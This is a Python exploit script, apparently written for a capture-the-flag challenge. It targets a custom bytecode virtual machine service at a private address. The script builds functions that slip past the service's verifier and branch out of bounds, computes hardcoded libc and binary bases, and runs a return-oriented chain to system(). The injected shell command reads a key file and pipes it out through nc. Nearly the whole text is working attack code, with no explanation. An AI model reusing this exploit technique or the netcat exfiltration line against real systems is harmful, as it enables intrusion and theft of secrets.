import telnetlib, struct
from socket import *

s = create_connection(('10.211.55.6', 1423))

PB = lambda x:struct.pack('B', x)
PH = lambda x:struct.pack('H', x)
PI = lambda x:struct.pack('I', x)
PQ = lambda x:struct.pack('Q', x)
UPH = lambda x:struct.unpack('H', x)[0]

def req(type, payload):
    p = PB(type) + PH(len(payload)) + payload
    #print repr(p)
    s.send(p)

def recv():
    length = UPH(s.recv(2))
    return s.recv(length)
"""
struct __attribute__ ((__packed__)) operation
{
    uint16_t opcode;
    uint64_t operand1;
    uint64_t operand2;
    uint64_t operand3;
};

struct __attribute__ ((__packed__)) function
{
    uint16_t num_ops;
    uint16_t num_args;
    uint8_t verified;
    struct operation bytecode[MAX_OPS];
};

struct __attribute__ ((__packed__)) run_func
{
    uint16_t index;
    uint16_t num_args;
    uint32_t args[];
};
"""
TYPE_ADDFUNC=0
TYPE_VERIFY=1
TYPE_RUNFUNC=2

OP_ADD=0
OP_BR=1
OP_BEQ=2
OP_BGT=3
OP_MOV=4
OP_OUT=5
OP_EXIT=6

def op(o, a1, a2 ,a3):
    return PH(o) + PQ(a1) + PQ(a2) + PQ(a3)
def op_out(a1):
    return op(OP_OUT, a1, 0, 0)
def op_exit():
    return op(OP_EXIT, 0, 0, 0)
def op_mov(a1, a2):
    return op(OP_MOV, a1, a2, 0)
def op_br(a1):
    return op(OP_BR, a1, 0, 0)

LDW = lambda x: x % (1<<32)
HDW = lambda x: x >> 32

raw_input()
# add_dummy
func = PH(0) + PH(10) + PB(0)
req(TYPE_ADDFUNC, func)
print repr(recv())

# verify
verify = PH(0)
req(TYPE_VERIFY, verify)
print repr(recv())

# add_real
func = PH(5) + PH(0) + PB(0)
payload = "\x00" * (26 - len(func)) # remaind
"""
# leak
payload += op_out(26)
payload += op_out(27)
#payload += op_out(26 + 48)
#payload += op_out(27 + 48)
"""

bin_base = 0x555555555efd - 0x1EFD
libc_base = 0x7ffff7834ec5 - 0x21ec5
payload += op_mov(26, 1)
payload += op_mov(27, 2)
payload += op_mov(28, 3)
payload += op_br(61)
payload = payload.ljust(26 * 5, "\x00") # fit to size
func += payload
req(TYPE_ADDFUNC, func)
print repr(recv())

func = PH(30) + PH(0) + PB(0)
payload = "\x00" * (26 - len(func) * 2) # remaind
payload += op_mov(29, 4)
payload += op_mov(30, 5)
payload += op_mov(31, 6)
payload += "D"*20
payload += ";cat /home/giggle/key|nc localhost 8080;"
payload = payload.ljust(26 * 30, "D") # fit to size
func += payload
req(TYPE_ADDFUNC, func)
print repr(recv())

# run func
system = libc_base + 0x46640
pop_rdi = 0x2053 + bin_base
sh = 0x203817 + bin_base
input = [0] + [LDW(pop_rdi), HDW(pop_rdi), LDW(sh), HDW(sh), LDW(system), HDW(system)]
ex = PH(0) + PH(len(input)) + ''.join(map(PI, input))
req(TYPE_RUNFUNC, ex)
print repr(recv())
